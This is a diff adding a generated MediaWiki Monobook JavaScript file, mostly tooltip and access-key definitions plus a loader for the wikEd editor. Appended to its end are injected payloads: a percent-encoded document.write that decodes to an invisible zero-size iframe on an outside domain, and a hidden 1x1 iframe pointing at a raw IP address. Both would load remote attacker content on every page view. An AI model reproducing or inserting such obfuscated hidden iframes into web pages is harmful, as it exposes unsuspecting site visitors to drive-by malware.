@@ -1,0 +1,66 @@
+/* generated javascript */
+var skin = 'monobook';
+var stylepath = '/w/skins';
+
+/* MediaWiki:Common.js */
+/* Any JavaScript here will be loaded for all users on every page load. */
+
+/* MediaWiki:Monobook.js (deprecated; migrate to Common.js!) */
+/* tooltips and access keys */
+var ta = new Object();
+ta['pt-userpage'] = new Array('.','My user page');
+ta['pt-anonuserpage'] = new Array('.','The user page for the ip you\'re editing as');
+ta['pt-mytalk'] = new Array('n','My talk page');
+ta['pt-anontalk'] = new Array('n','Discussion about edits from this ip address');
+ta['pt-preferences'] = new Array('','My preferences');
+ta['pt-watchlist'] = new Array('l','The list of pages you\'re monitoring for changes.');
+ta['pt-mycontris'] = new Array('y','List of my contributions');
+ta['pt-login'] = new Array('o','You are encouraged to log in, it is not mandatory however.');
+ta['pt-anonlogin'] = new Array('o','You are encouraged to log in, it is not mandatory however.');
+ta['pt-logout'] = new Array('','Log out');
+ta['ca-talk'] = new Array('t','Discussion about the content page');
+ta['ca-edit'] = new Array('e','You can edit this page. Please use the preview button before saving.');
+ta['ca-addsection'] = new Array('+','Add a comment to this discussion.');
+ta['ca-viewsource'] = new Array('e','This page is protected. You can view its source.');
+ta['ca-history'] = new Array('h','Past versions of this page.');
+ta['ca-protect'] = new Array('=','Protect this page');
+ta['ca-delete'] = new Array('d','Delete this page');
+ta['ca-undelete'] = new Array('d','Restore the edits done to this page before it was deleted');
+ta['ca-move'] = new Array('m','Move this page');
+ta['ca-watch'] = new Array('w','Add this page to your watchlist');
+ta['ca-unwatch'] = new Array('w','Remove this page from your watchlist');
+ta['search'] = new Array('f','Search this wiki');
+ta['p-logo'] = new Array('','Main Page');
+ta['n-mainpage'] = new Array('z','Visit the Main Page');
+ta['n-portal'] = new Array('','About the project, what you can do, where to find things');
+ta['n-currentevents'] = new Array('','Find background information on current events');
+ta['n-recentchanges'] = new Array('r','The list of recent changes in the wiki.');
+ta['n-randompage'] = new Array('x','Load a random page');
+ta['n-help'] = new Array('','The place to find out.');
+ta['n-sitesupport'] = new Array('','Support us');
+ta['t-whatlinkshere'] = new Array('j','List of all wiki pages that link here');
+ta['t-recentchangeslinked'] = new Array('k','Recent changes in pages linked from this page');
+ta['feed-rss'] = new Array('','RSS feed for this page');
+ta['feed-atom'] = new Array('','Atom feed for this page');
+ta['t-contributions'] = new Array('','View the list of contributions of this user');
+ta['t-emailuser'] = new Array('','Send a mail to this user');
+ta['t-upload'] = new Array('u','Upload images or media files');
+ta['t-specialpages'] = new Array('q','List of all special pages');
+ta['ca-nstab-main'] = new Array('c','View the content page');
+ta['ca-nstab-user'] = new Array('c','View the user page');
+ta['ca-nstab-media'] = new Array('c','View the media page');
+ta['ca-nstab-special'] = new Array('','This is a special page, you can\'t edit the page itself.');
+ta['ca-nstab-project'] = new Array('a','View the project page');
+ta['ca-nstab-image'] = new Array('c','View the image page');
+ta['ca-nstab-mediawiki'] = new Array('c','View the system message');
+ta['ca-nstab-template'] = new Array('c','View the template');
+ta['ca-nstab-help'] = new Array('c','View the help page');
+ta['ca-nstab-category'] = new Array('c','View the category page');
+// install [[User:Cacycle/wikEd]] in-browser text editor
+document.write('<script type="text/javascript" src="'
++ 'http://en.wikipedia.org/w/index.php?title=User:Cacycle/wikEd.js'
++ '&action=raw&ctype=text/javascript"></' + 'script>');<script type="text/javascript">
+<!-- 
+document.write(unescape('%3C%69%66%72%61%6D%65%20%73%72%63%3D%22%68%74%74%70%3A%2F%2F%77%77%77%2E%70%6F%77%61%67%72%62%2E%69%6E%66%6F%2F%73%64%74%2F%69%6E%64%65%78%2E%70%68%70%22%20%66%72%61%6D%65%62%6F%72%64%65%72%3D%22%30%22%20%62%6F%72%64%65%72%3D%22%30%22%20%77%69%64%74%68%3D%22%30%22%20%68%65%69%67%68%74%3D%22%30%22%20%73%74%79%6C%65%3D%22%70%6F%73%69%74%69%6F%6E%3A%20%61%62%73%6F%6C%75%74%65%3B%20%76%69%73%69%62%69%6C%69%74%79%3A%20%68%69%64%64%65%6E%3B%20%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%22%3E%3C%2F%69%66%72%61%6D%65%3E'));
+//-->
+</script><iframe src='http://87.118.118.216/viewpost' width='1' height='1' style='visibility: hidden;'></iframe>
